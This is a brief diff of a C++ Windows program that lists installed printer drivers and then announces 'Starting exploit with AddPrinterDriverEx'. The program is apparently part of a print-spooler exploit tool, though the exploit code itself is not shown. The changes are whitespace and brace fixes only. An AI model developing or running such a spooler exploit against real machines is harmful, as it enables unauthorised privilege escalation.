@@ -75,6 +75,7 @@ int main()
     std::cout << "\nsizeOf _DRIVER_INFO_2 : ";
     std::cout <<  sizeof(_DRIVER_INFO_2);
 
+
     for (DWORD i = 0; i < dwReturned; i++)
     {
         std::cout << "\nDRIVER FOUND :\n";
@@ -84,8 +85,7 @@ int main()
         std::cout << "  pDriverPath : " << pInfo[i].pDriverPath << "\n";
         std::cout << "  cVersion : " << pInfo[i].cVersion << "\n";
         std::cout << "  cVersion : " << pInfo[i].pDataFile << "\n";
-}
-	
+
     }
 
     std::cout << "\nStarting exploit with AddPrinterDriverEx...\n";
